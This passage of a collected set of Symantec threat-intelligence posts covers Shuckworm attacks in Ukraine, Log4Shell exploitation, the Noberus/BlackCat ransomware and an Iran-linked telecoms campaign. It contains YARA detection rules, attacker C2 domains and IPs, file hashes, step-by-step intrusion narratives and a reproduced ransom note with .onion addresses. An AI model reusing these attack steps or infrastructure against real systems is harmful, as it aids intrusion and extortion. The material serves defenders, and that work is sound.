\"3db621cac1d026714356501f558b1847212c91169314c1d43bfc3a4798467d0d\" hash = \"789f0ec8e60fbc8645641a47bc821b11a4486f28892b6ce14f867a40247954ed\" $m1 = \"BKB_Test\" fullword $m2 = \"KLG_sd76bxds1N\" fullword $k1 = \"[%d/%02d/%02d %02d:%02d:%02d K-E-Y-L-O-G]\" fullword $k2 = \"[%d/%02d/%02d %02d:%02d:%02d C-L-I-P-B-D]\" fullword $k3 = \"< Title--%s-- >\" fullword $k4 = \"ImpersonateLoggedOnUser Error(%d)\" fullword $f1 = {55 73 65 72 ?? ?? ?? 00 00 00 ?? ?? ?? 6B 65 79 2E} // Userkey. $f2 = {55 73 65 72 ?? ?? ?? 00 00 00 ?? ?? ?? 64 61 74 2E} // Userdat. uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($k*) or (any of ($m*) and any of ($f*))) author = \"Symantec, a division of Broadcom\" description = \"BlackHole/BlackSwan / QuasarRAT/xClient loader\" hash = \"29d7b82f9ae7fa0dbaf2d18c4d38d18028d652ed1ccc0846e8c781b4015b5f78\" $s1 = \"Call %s.%s(\\\"%s\\\") => %d\" fullword wide $s2 = \"Assembly::CreateInstance failed w/hr 0x%08lx\" fullword wide $s4 = \"NULL == checkID hMutex\" fullword $s5 = \"checkID Mutex ERROR_ALREADY_EXISTS\" fullword $s6 = \"dllmain mutex ERROR_ALREADY_EXISTS\" fullword $x1 = \"xClient.Program\" fullword wide $x2 = \"LoadPayload\" fullword $m1 = \"SFZJ_Wh16gJGFKL\" ascii wide $m2 = \"d5129799-e543-4b8b-bb1b-e0cba81bccf8\" ascii wide $m3 = \"USA_HardBlack\" ascii wide $b1 = \"BlackHole.Slave.Program\" fullword wide $b2 = \"NuGet\\\\Config\" wide $b3 = \"VisualStudio.cfi\" wide $p = {E1 F6 3C AC AF AC AC AC A8 AC AC AC 53 53 AC AC 14} $t = \"0s+Nksjd1czZ1drJktPO24aEjISMtsvLy5LJzNjdyNnL1dLY08uS39PRhoSMhIy2jYyPkomNko2IjJKEiIaEjISM\" uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 2 of ($s*) and (all of ($x*) or any of ($m*) or all of ($b*) or $p or $t) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/china-apt-antlion-taiwan-financial-attacks"
  },
  {
    "title": "shuckworm gamaredon espionage ukraine",
    "content": "The Russia-linked Shuckworm group (aka Gamaredon, Armageddon) is continuing to conduct cyber-espionage attacks against targets in Ukraine. Over the course of recent months, Symantec’s Threat Hunter Team, a part ofBroadcom Software, has found evidence of attempted attacks against a number of organizations in the country. Active since at least 2013, Shuckworm specializes in cyber-espionage campaigns mainly against entities in Ukraine. The group is known to use phishing emails to distribute either freely available remote access tools, including Remote Manipulator System (RMS) and UltraVNC, or customized malware called Pterodo/Pteranodon to targets. Arecent reportpublished by The Security Service of Ukraine (SSU) noted that Shuckworm’s attacks have grown in sophistication in recent times, with attackers now using living-off-the-land tools to steal credentials and move laterally on victim networks. Recent activity seen by Symantec is consistent with that documented by SSU. Symantec observed Shuckworm activity on an organization in Ukraine, which began on July 14, 2021 and continued until August 18, 2021. The attack chain began with a malicious document, likely sent via a phishing email, which was opened by the user of the infected machine. The following is a breakdown of the attackers’ activity on the compromised computer. At 08:48 (local-time), a suspicious Word document is opened on the machine. Just five minutes after the document is opened, a suspicious command is also executed to launch a malicious VBS file (depended.lnk). This file is a known custom backdoor leveraged by Shuckworm (aka Pterodo). The backdoor is used to download and execute CSIDL_PROFILE\\searches\\depended.exe (94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b) from hxxp://92.242.62.131/wordpress.php?is=[REDACTED]. Two additional VBS scripts are observed being executed via depended.exe: A scheduled task is then created to likely ensure persistence between system reboots and to execute the dropped script. This ensures the VBS file deep-thoughted.ppt is executed every 10 minutes: Later, the attackers are observed executing an HTA file hosted on a remote server by abusing mshta.exe via depended.exe. The Mshta utility can execute Microsoft HTML Application (HTA) files and can be abused to bypass application control solutions. Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings. At the same time, a new variant of Pterodo is installed via depended.exe. Similarly to before, two additional scheduled tasks are created: The attackers continue to install variants of their backdoor and execute commands via scripts to ensure persistence: Directly after this, it appears the attackers test connectivity to a new C&C server via ping.exe: Once the connection is confirmed to be active, the attackers proceed to download another variant of their Pterodo backdoor and begin using the new C&C to download additional scripts and tools, as well as creating scheduled tasks to run every few minutes. At this point, the attackers cease activity. However, we continue to see commands being executed from the scheduled tasks for the remainder of July 14. At 05:28, the attackers return, and several additional variants of Pterodo are executed via CSIDL_COMMON_VIDEO\\planeta.exe (1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1). The attackers are then observed executing commands via planeta.exe: The above flushdns command may indicate that the attackers have updated the DNS records for their C&Cs, as we observed some of their tools use hard-coded domains. In this particular instance, the flushdns command was executed shortly before the attackers attempted to install additional backdoors that leveraged the same C&C. Later, another variant ofPterodo (deep-sided.fly) was executed and was used to download and execute a new file called deerskin.exe (ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29). This file is a dropper for a VNC client. When executed, it pings google DNS (8.8.8.8) to test internet connectivity, then proceeds to drop a VNC client and establishes a connection to a remote C&C server controlled by the attackers: Two such files have been identified that perform the same actions: This VNC client appears to be the ultimate payload for this attack. Between July 29 and August 18 activity continued whereby we observed the attackers deploying multiple variants of their custom VBS backdoor along with executing VBS scripts and creating scheduled tasks similar to the ones detailed above. After August 18, no further suspicious activity was observed on this machine. During the course of this investigation, specifically post VNC client installation, a number of documents were opened from various locations on the compromised machine. It is unclear if this was legitimate user activity or the activity of the attackers attempting to collect and exfiltrate sensitive information. Titles of the documents accessed ranged from job descriptions to sensitive information pertaining to the targeted organization. Symantec investigations uncovered a total of seven files used by Shuckworm in recent attacks. All seven files are 7-zip SFX self-extracting binaries, a format used previously in Shuckworm attacks. Upon execution, the file named descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) drops a VBS file which, in turn, drops a second VBS file in the following locations: It then creates the following task: The file deerbrook.ppt (b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e) VBS file contacts a command-and-control (C&C) server at deep-pitched.enarto.ru. If the C&C server is available, a HTTP POST request is sent to download a payload, which is saved in the %USERPROFILE% folder as deep-sunken.tmp then renamed to deep-sunken.exe and executed. The binary is then deleted. Upon execution, the file deep-sunken.exe (02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200) drops the following files on the compromised computer: It then creates the following task: It then connects to a C&C server (arianat.ru) to download another payload using wget: The baby.dat file is a VBS file that executes baby.cmd, which then downloads and executes the payload from the C&C server. The vb_baby.vbs file renames the downloaded payload from baby.php to backed.exe. The downloaded payload (backed.exe) could not be retrieved. However, the following files were also obtained during our investigation: The file z4z05jn4.egf.exe (fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0) is similar to the previous file (deep-sunken.exe) but with different folders, file names, and C&C server (iruto.ru). Once executed, the file defiant.exe (a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455) drops a VBS file in the following locations: It then creates the following task: The dropped file deep-versed.nls (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a payload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the following location: The file deep-green.exe (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f) contains an UltraVNC binary, which upon execution connects to a repeater (mucoris.ru:5612) using the following command line: UltraVNC is an open-source remote-administration/remote-desktop-software utility. A second file named deep-green.exe (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa) contain a Process Explorer (procexp) binary. Process Explorer is a freeware task manager and system monitor for Microsoft Windows. A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru). The fourth and final file named deep-green.exe (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file in the following location: It then creates the following task: The MediaConvertor.dat file searches for removable drives and creates a .lnk file with the following command: Analysis of the many indicators of compromise (IOCs) uncovered during our investigations have revealed the following patterns, which may be of use when defending networks from Shuckworm attacks: According to aNovember 2021 reportfrom the SSU, since 2014 the Shuckworm group has been responsible for over 5,000 attacks against more than 1,500 Ukrainian government systems. As evidenced by Symantec’s recent investigations into attempted Shuckworm attacks against a number of organizations in Ukraine, this activity shows little sign of abating. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
  },
  {
    "title": "threat landscape 2021",
    "content": "From the evolving ransomware ecosystem to attacks against critical infrastructure, Symantec looks back over thecyber-security trends that shaped 2021. A new whitepaper from Symantec, a division ofBroadcom Software, takes a look back at the some of the major threats that shaped the threat landscape during 2021. Ransomware was arguably the most significant threat facing organizations in 2021, with some ransomware operators departing the scene, new ones entering the fold, and business models and tactics being refined to make targeted ransomware more lucrative than ever. However, ransomware wasn’t the only threat, with supply chain attacks, an increase in attackers exploiting vulnerabilities in public-facing applications, and attacks against critical infrastructure also shaping the threat landscape in 2021. Ransomware, or more precisely, targeted ransomware, was the most dominant threat making headlines throughout 2021. Ransomware gangs moved towards targeting entities with a broad network of downstream users. These upstream entities included large software developers and organizations involved in critical infrastructure, as seen in the Kaseya and Colonial Pipeline attacks. Targeting managed service providers (MSPs) also gave attackers the opportunity to infect potentially thousands of victims by compromising just one. While as in previous years, the total number of ransomware attacks detected and blocked by Symantec in 2021 continues to trend downwards, this doesn’t mean ransomware activity is becoming less of a threat. This downward trend is due to a significant decrease in relatively unsophisticated, indiscriminate ransomware attacks and threat actors shifting their focus to large organizations where they can cause more disruption and demand higher ransom amounts. The number of these targeted ransomware attacks rose from around 80 in January 2020 to more than 200 in September 2021. This increase in targeted ransomware attacks is partly fueled by two relatively recent developments: the rise of so-called initial access brokers (IABs), threat actors that sell access to compromised networks to the highest bidder, which in recent times has become targeted ransomware gangs; and a rise in ransomware-as-a-service (RaaS), a subscription-based model that lets individuals or gangs known as affiliates use already-developed ransomware threats in their attacks. The RaaS model greatly increases the number of adversaries an organization faces, with multiple attackers now attempting to deliver the same ransomware, but using different tactics, techniques, and procedures (TTPs). Due to the growth in the RaaS market, affiliates now have the option to migrate to another ransomware should their current one shut down. In addition,Symantec has observedaffiliates using two different strains of ransomware in a very short space of time and, in some cases, during the same attack. This suggests that some affiliates have enough of a reputation to not be locked in to an exclusive agreement with one ransomware operator. While as in previous years, the total number of ransomware attacks detected and blocked by Symantec in 2021 continues to trend downwards, this doesn’t mean ransomware activity is becoming less of a threat. Botnets are now also playing a key role in ransomware attacks, with many older financial fraud botnets having been repurposed to spread ransomware. In some cases, it is the same threat actor behind both the ransomware and the botnet. For example, Trickbot is believed to be controlled by the Miner group (aka Wizard Spider) which is also linked to both the Ryuk and Conti ransomware. Another takeaway from the year concerning ransomware included operators targeting industries that were hardest hit by the COVID-19 pandemic. A prime example of this was theattack against Ireland’s national health service, the Health Service Executive, by the Conti (aka Miner, Wizard Spider) ransomware operators. Last year also saw the REvil (aka Leafroller, Sodinokibi) ransomware’s infrastructure compromised by law enforcement, whichgained control of at least some of REvil’s servers. However, as with previous efforts to halt the gang’s activity, REvil is likely to reappear in some form following the most recent takedown effort. In 2021, targeted ransomware groups also began threatening victims in order to prevent them from sharing details of attacks with media or ransomware negotiating firms. Both the Conti and Grief ransomware gangs said that they would publish stolen victim data or delete decryption keys if transcripts or screenshots of ransom negotiations were publicly shared. The announcement was likely prompted by a growing number of media reports containing details of ransom negotiations. Other threat groups also employed similar tactics, including Ragnar Locker and a new ransomware threat called Yanluowang, which wasuncovered by Symantec’s Threat Hunter Team. Software supply chain attacks, due to their potential to disrupt large sections of society and business, remain a concern for governments and businesses around the world. Two significant supply chain attacks in the headlines from last year included the SolarWinds hack and the Kaseya attack. While the SolarWinds attack occurred in late 2020 it continued to make waves well into 2021. The attackers responsible for the attack, the Russia-backed Nobelium (aka Hagensia) group, has remained active. A new backdoor threat (Tomiris) likely developed by Nobelium was uncovered in September. The malware has similarities to the SUNSHUTTLE second-stage malware used by Nobelium in the SolarWinds attack. While another post-exploitation backdoor (FoggyWeb) was also linked to Nobelium. The malware is designed to steal sensitive data from compromised Active Directory Federation Services (AD FS) servers. The attack against IT management software maker Kaseya, which was carried out by the REvil ransomware operators, impacted multiple managed service providers (MSPs) that used the company’s software. While Kaseya reported that approximately 60 of their customers were impacted by the attack, those customers were MSPs with numerous customers themselves. The estimated number of organizations compromised as a result of the supply chain attack was 1,500. The attack was carried out during the U.S. July 4 holiday weekend, likely in an attempt to have the attack go unnoticed for as long as possible due to many employees being on leave. This is a tactic that is increasingly being adopted by threat actors. While the Kaseya and SolarWinds attacks are the most significant, they are by no means the only supply chain attacks in recent times. According toa reportfrom the Identity Theft Resource Center (ITRC), supply chain attacks are increasing, with 793,000 more individuals being affected by such attacks in the first three quarters of 2021 than in the entire 12 months of 2020. Last year saw an increase in attackers exploiting vulnerabilities in public-facing applications in order to gain access to organizations’ networks. While in some cases attackers are focusing on zero-day bugs, more frequently they are looking towards recently patched vulnerabilities and the hunt for unpatched systems. A notable example of this was the critical vulnerabilities in Microsoft Exchange Server, collectively known as ProxyLogon. The flaws were patched in early March 2021, with Microsoft saying at the time that the bugs were being exploited by an advanced persistent threat (APT) group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, shortly after the ProxyLogon vulnerabilities were disclosed, other threat actors began exploiting them. This quick adoption was also highlighted when another string of vulnerabilities in Microsoft Exchange Server, dubbed ProxyShell, were publicly revealed in August 2021. Exploit attempts targeting these bugs began immediately, with Symantec data showing more than 200,000 exploit attempts targeting this set of vulnerabilities in August 2021 alone. Other vulnerabilities in public-facing applications that were frequently exploited by threat actors in 2021 include flaws in VPN products from Pulse Secure (CVE 2019-11510), Fortinet (CVE-2018-13379), and SonicWall (CVE-2021-20016), and vulnerabilities in Accellion’s File Transfer Appliance (FTA) software (CVE-2021-27101, CVE-2021-27102, CVE-2021-27103, and CVE-2021-27104). Cyber-attacks against critical national infrastructure (CNI) can be some of the most impactful as they can potentially affect everyone in society. This was highlighted in May 2021, when the Colonial Pipeline, the largest petroleum pipeline in the U.S., suffered a ransomware attack that impacted equipment managing the pipeline. The attack was carried out by the Russia-based DarkSide ransomware gang. While the ransom was paid just hours after the attack took place, decryption was slow and the pipeline’s operation was halted, causing fuel shortages, price increases, and panic buying across a number of U.S. states. The Colonial Pipeline attack was not an isolated incident, with news also emerging in July 2021 that Chinese state-sponsored threat actors hadtargeted 23 U.S. oil and gas pipeline operatorsin attack campaigns between 2011 and 2013. U.S. officials announced that the aim of the actors behind the attacks was to “help China develop cyber attack capabilities against U.S. pipelines to physically damage pipelines or disrupt pipeline operations.” Attacks against CNI show no signs of stopping, with the number of network-based detections related to attacks targeting CNI trending upward (Figure 3). These attacks are blocked by Symantec’s Intrusion Prevention System (IPS) technologies. Malicious activity blocked on the network saw a decline after a peak in July 2021, however, overall the numbers are trending upward. In terms of regions that see the most activity targeting the networks of CNI organizations, the U.S. is bounds ahead of others on the list with 69% of all activity seen there. This was just a sample of the content in our latest whitepaper.Read the full paperfor more insights into the threat landscape of 2021. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/threat-landscape-2021"
  },
  {
    "title": "log4j vulnerabilities attacks",
    "content": "Apache Log4j is a Java-based logging utility. The library’s main role is to log information related to security and performance to make error debugging easier and to enable applications to run smoothly. The library is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j has been making headlines recently after the public disclosure of three critical vulnerabilities in the utility which can lead to remote code execution (CVE-2021-44228 and CVE-2021-45046) and denial of service (CVE-2021-45105). The initial remote code execution vulnerability (CVE-2021-44228) has been dubbed Log4Shell and has dominated cyber-security news ever since it was publicly disclosed on December 9. The vulnerability has been exploited to deploy a plethora of payloads like coin miners, Dridex malware, and even ransomware such as Conti. Symantec, a division ofBroadcom Software, has observed numerous variations in attack requests primarily aimed at evading detection. Some sample attack requests can be seen in Table 1. Attackers are predominantly using the LDAP and RMI protocols to download malicious payloads. We have also recorded vulnerability scans using protocols such as IIOP, DNS, HTTP, NIS etc. Muhstik Botnet -We have observed attackers downloading malicious Java class files as a part of Log4shell exploitation. The malicious class file downloads a shell file with the content shown in Figure 1. The shell script attempts to download Executable and Linkable Format (ELF) files and execute them, which leads to the installation of the Muhstik botnet. XMRig miner -We have also observed attackers installing the XMRig cryptocurrency miner as a part of post-exploitation activity related to Log4shell exploitation. The miner is downloaded via a simple PowerShell command (Figure 2). The miner is executed with the command shown in Figure 3. Malicious class file backdoor -We have also seen attacks attempt to download a malicious Java class file that acts as a backdoor. The class file has code to listen for and execute commands from the attacker (Figure 4). Reverse Bash shell –Attackers were alsoobserved deploying reverse shells on vulnerable machines (Figure 5). Other publicly reported payloads include the Khonsari and Conti ransomware threats, the Orcus remote access Trojan (RAT), and the Dridex malware, among others. For the period between December 9 (when the first Log4j vulnerability was disclosed) and December 21, Symantec’s Intrusion Prevention System (IPS) blocked more than 93 million Log4Shell related exploitation attempts on more than 270,000 unique machines. During the same time frame, IPS blocked more than 18 million Log4Shell related exploitation attempts on more than 60,000 unique server machines. The majority of Log4Shell attacks blocked by Symantec were against machines located in the U.S. and the United Kingdom, followed by Singapore, India, and Australia. Meanwhile, the majority of attacks exploiting the Log4j vulnerabilities seem to originate from devices located in the U.S. and Germany, followed by Russia, the United Kingdom, and China. Machine learning-based DCS provides multi-layered protection for Windows, Linux Server workloads, and container applications for this vulnerability: Siddhesh works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division. He analyzes and creates IPS protection for various network-based threats such as exploit kits and tech support scams. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/log4j-vulnerabilities-attacks"
  },
  {
    "title": "noberus blackcat alphv rust ransomware",
    "content": "Symantec’s Threat Hunter Team has additional technical information to share on the new ALPHV/BlackCat ransomware that was first published about last week, and which we have been tracking for several weeks. Symantec, a division ofBroadcom Software, tracks this ransomware as Ransom.Noberus and our researchers first spotted it on a victim organization on November 18, 2021, with three variants of Noberus deployed by the attackers over the course of that attack. This would appear to show that this ransomware was active earlier than was previously reported, withMalwareHunterTeam having toldBleepingComputerthey first saw this ransomware on November 21. Noberus is an interesting ransomware because it is coded in Rust, and this is the first time we have seen a professional ransomware strain that has been used in real-world attacks coded in this programming language. Noberus appears to carry out the now-typical double extortion ransomware attacks where they first steal information from victim networks before encrypting files. Noberus adds the .sykffle extension to encrypted files. This blog contains information about the attack chain we observed in one victim organization, as well as technical details about the operation of this ransomware. The first suspicious activity observed by Symantec occurred on a victim’s network on November 3, approximately two weeks before Noberus was deployed. During this time, suspicious network activity was observed. Later on November 18, shortly before Noberus was deployed, ConnectWise was also executed. A few hours later, Noberus was deployed, indicating that the attackers may have leveraged access to ConnectWise to deploy their payload. While it is a legitimate tool, ConnectWise has frequentlybeen exploited by ransomware attackers in recent timesto gain access to victim networks. On November 3, suspicious Server Message Block (SMB) requests occurred on the earliest machine to get infected on the victim network. This was followed by remote Local Security Authority (LSA) registry dump attempts from a remote machine on the network. This suggests the attackers may have compromised another machine on the network where we didn't have visibility, or they could also have added a new machine to the domain from which they were launching attacks to dump credentials. On the same day, PsExec was also executed from a remote machine to launch a command prompt. The attackers used this to disable a restricted remote administration feature known as ‘RestrictedAdmin mode’ via the Windows registry. This effectively disables safeguards guarding against 'pass the hash' attacks targeting Remote Desktop Protocol (RDP), allowing the attackers to attempt to gain higher administrative privileges. The next activity occurred on November 18 when PsExec was used to run multiple PowerShell commands to effectively disable Windows Defender. Specifically, the PowerShell command used added *.exe to an exclusion list for AV scanning, and this command was executed across the entire organization. Later on November 18, the first instance of Noberus ransomware was deployed via PsExec. In order for Noberus to execute properly, it requires a specific ‘access-token’. This acts as a unique key, which is used to distinguish the victim when visiting the Noberus operators’ Tor site. The following similar commands were observed being executed: In the above, PsExec is launched with the following specific command line arguments: For the second command above, the ‘no-net’ command line argument instructs Noberus not to process network shares during propagation. See the Technical Details below for a full list of support command line arguments and their description. In all the samples of Noberus that we have access to, the victim’s administrative credentials are embedded as part of the configuration block, showing that this attack was specifically targeted at this victim. Once Noberus is executed, the ransomware first deletes any available shadow copies, which is typical in ransomware attacks, in order to stop the organization from restoring encrypted files. Noberus then runs commands to collect system information via WMIC, in order to collect Universally Unique Identifiers (UUIDs) from each machine. These are then used to generate the ‘access token’ that makes up part of the unique Tor address victims are instructed to visit. We also saw a fsutil command being executed by Noberus. Fsutil performs tasks that are related to file allocation table (FAT) and NTFS file systems. In this incident, the attacker is specifically modifying the SymLink Evaluation behavior to modify the type of symbolic links that can be created on the system. Symbolic links create a file in your directory that acts as a shortcut to another file or folder. This is used to follow various types of shortcuts (local and remote), likely to ensure Noberus can follow these shortcuts and perform encryption. As part of the propagation mechanism, Noberus attempts to mount hidden partitions. It then attempts to spread via the ‘net use’ command. The embedded administrative credentials are used as part of this mechanism along with PsExec, which is embedded in a compressed form within Noberus. During the attack, the attackers were also seen modifying the maximum limit of concurrent requests machines could make via PsExec. This was likely to aid in the propagation of Noberus across the network. At this stage, Noberus proceeds to terminate a set of pre-defined processes and begin the encryption process. At some point during the attack the organization became aware of the infection and deployed remediation software. However, despite this, it appears the attackers were able to return and deploy another variant of their ransomware to other systems on the network. In total, three variants of this ransomware were identified during this intrusion, leading to at least 261 machines on the network becoming infected with Noberus. A technical analysis of Noberus itself found that a lot of its behavior is consistent with the activity we saw on the victim network. The first step it takes after being deployed on victim networks is to remove shadow copies: It then issues a command to collect Universally Unique Identifiers (UUIDs) from infected machines. The UUID and parameter ‘access token’ are then used to generate \"ACCESS_KEY\". Noberus then enables the remote-to-local and remote-to-remote symbolic link evaluations. It then attempts to mount a hidden partition, by issuing the following commands: Noberus then cleans up the Recycle Bin and attempts to propagate via network share. It looks for available shares by using the ‘net use’ command or NetShareEnum function. Embedded administrative credentials may then be used for propagation via network share. Noberus also attempts to propagate via PsExec. The PsExec module is embedded in the Noberus code (see Figure 1). It is compressed with zlib (Figure 2). The decompressed PsExec file is a legitimate Microsoft-signed clean file (Figure 3). Once it has gained access to a machine, Noberus then proceeds to kill the following processes and services: It also excludes certain directories, filenames, and file extensions from the encryption process, such as: Noberus then proceeds to encrypt files using either AES or ChaCha20 encryption. The private key for encrypted machines appears to be generated randomly. It appears that Noberus generates a random number using BCryptGenRandom and calculates each byte with the string shown inFigure 4. Files that have been encrypted have .sykffle appended to the end of their filename, in the following format: Noberus then creates a ransomware note, creating a .txt and a .png file that are displayed to victims, with the following filenames: The text file tells victims the following: Important files on your system was ENCRYPTED and now they have \"sykffle\" extension. In order to recover your files you need to follow instructions below. Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate. - Employees personal data, CVs, DL, SSN. - Complete network map including credentials for local and remote services. - Financial information including clients’ data, bills, budgets, annual reports, bank statements. - Complete datagrams/schemas/drawings for manufacturing in solidworks format Private preview is published here: http://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd[.]onion/[REDACTED] DO NOT MODIFY FILES YOURSELF. DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA. YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS. YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY. >> Recovery procedure Follow these simple steps to get in touch and recover your data: 1) Download and install Tor Browser from: https://torproject.org/ 2) Navigate to: http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd[.]onion/?access-key=[REDACTED] This is a sophisticated new ransomware with no apparent weaknesses in its encryption process, meaning unless victims have comprehensive backups they will be obliged to pay the ransom to recover their files. The fact it is written in Rust is interesting, as while Rust is not typically seen being used by malware developers, it is growing in popularity and it shows that ransomware developers too are not afraid to innovate in this area. While the reported number of victims of this ransomware so far appears to be small, the sophistication of Noberus itself and the level of determination shown by the attackers in the attack we did observe indicates it is likely we will see more of this ransomware in the future. It is also reported that the developers behind this ransomware are actively seeking affiliates on Russian-speaking hacking forums, meaning the number of malicious actors deploying this ransomware is likely to grow. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware"
  },
  {
    "title": "espionage campaign telecoms asia middle east",
    "content": "Attackers most likely linked to Iran have attacked a string of telecoms operators in the Middle East and Asia over the past six months, in addition to a number of IT services organizations and a utility company. Organizations in Israel, Jordan, Kuwait, Saudi Arabia, the United Arab Emirates, Pakistan, Thailand, and Laos were targeted in the campaign, which appears to have made no use of custom malware and instead relied on a mixture of legitimate tools, publicly available malware, and living-off-the-land tactics. While the identity of the attackers remains unconfirmed, there is some evidence to suggest a link to the Iranian Seedworm (aka MuddyWater) group.  The targeting and tactics are consistent with Iranian-sponsored actors. After breaching a targeted network, the attackers typically attempt to steal credentials and move laterally across the network. They appear to be particularly interested in Exchange Servers, deploying web shells onto them. In some cases, the attackers may be using compromised organizations as stepping stones to additional victims. Furthermore, some targets may have been compromised solely to perform supply-chain-type attacks on other organizations. In most attacks, the infection vector is unknown. Evidence of a possible vector was found at only one target. A suspected ScreenConnect setup MSI appeared to have been delivered in a zipped file named “Special discount program.zip”, suggesting that it arrived in a spear-phishing email. In one attack against a telecoms firm in the Middle East, which began in August 2021, the first evidence of compromise was the creation of a service to launch an unknown Windows Script File (WSF). Scripts were then used to issue various domain, user discovery, and remote service discovery commands. The attackers used PowerShell to download another WSF and run it. Net group was used to query for the “exchange trusted subsystem” domain group. The attackers used Certutil to download a suspected Ligolo tunneling tool and launch WMI, which was used to get remote machines to carry out the following tasks: Based on process lineage data, attackers seemed to use scripts extensively. These may be automated scripts used for collecting information and downloading additional tools. However, in one instance, a command asks cURL for help, suggesting that there may have been at least some hands-on-keyboard activity on the part of the attackers. The attackers then used a remote access tool, believed to be eHorus, to perform the following tasks: One feature of this attack against a telecoms organization is that the attackers may have attempted to pivot to other targets by connecting to the Exchange Web Services (EWS) of other organizations, another telecoms operator, and an electronic equipment company in the same region. The following commands were used: It is unclear what the intent of these requests is. It is possible the attackers were attempting to check connectivity to these organizations. One target that appeared to be an outlier was a utility company in Laos. The infection vector may have been the exploit of a public-facing service since the first machine that appeared to be compromised was an IIS web server. Suspicious activity also had w3wp.exe in the process lineage. The attackers then used PowerShell to: The attackers then used PowerShell to connect to a webmail server of an organization in Thailand. They also attempted to connect to IT-related servers belonging to another company in Thailand. To facilitate credential theft, WMI was used to execute PowerShell to modify the registry to store passwords in plaintext in memory. In addition to this, an obfuscated version of the publicly available CrackMapExec tool appeared to be deployed. The attackers made heavy use of legitimate tools and publicly available hacking tools. These include: There is some evidence to suggest that the Iranian Seedworm group was responsible for these attacks. Two IP addresses used in this campaign have been previously linked to Seedworm activity. However, Seedworm is known to regularly switch its infrastructure, meaning conclusive attribution cannot be made. There is also some overlap in tools between this campaign and earlier Seedworm campaigns. ScreenConnect, RemoteUtilities, SharpChisel, Ligolo, ProcDump, and Password Dumper were all referenced by Trend Micro in aMarch 2021 blog on Seedworm activity. In the case of two tools – SharpChisel and Password Dumper – identical versions were used in this campaign to those that were documented by Trend. If these attacks are linked to Iran, it will not be the first time an Iranian threat actor has targeted the telecoms sector.In 2018, Symantec revealedthat the Chafer group had compromised of a major telecoms services provider in the Middle East. While the ultimate end goal of the campaign remains unknown, the focus on telecoms operators suggests that the attackers are gathering intelligence on the sector and possibly attempting to pivot into spying on communications. For the latest protection updates, please visit theSymantec Protection Bulletin. ae5d0ad47328b85e4876706c95d785a3c1387a11f9336844c39e75c7504ba365 – Ligolo e0873e15c7fb848c1be8dc742481b40f9887f8152469908c9d65930e0641aa6b – Ligolo 22e7528e56dffaa26cfe722994655686c90824b13eb51184abfe44d4e95d473f – Hidec b0b97c630c153bde90ffeefc4ab79e76aaf2f4fd73b8a242db56cc27920c5a27 – Nping b15dcb62dee1a8499b8ac63064a282a06abf0f7d0302c5e356cdb0c7b78415a9 – LSASS Dumper 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2 – SharpChisel ccdddd1ebf3c5de2e68b4dcb8fbc7d4ed32e8f39f6fdf71ac022a7b4d0aa4131 – Password Dumper facb00c8dc1b7ed209507d7c56d18b2c542c4e0b2986b9bfaf1764d8e252576b – CrackMapExec 1a107c3ece1880cbbdc0a6c0817624b0dd033b02ebaf7fa366306aaca22c103d – ProcDump 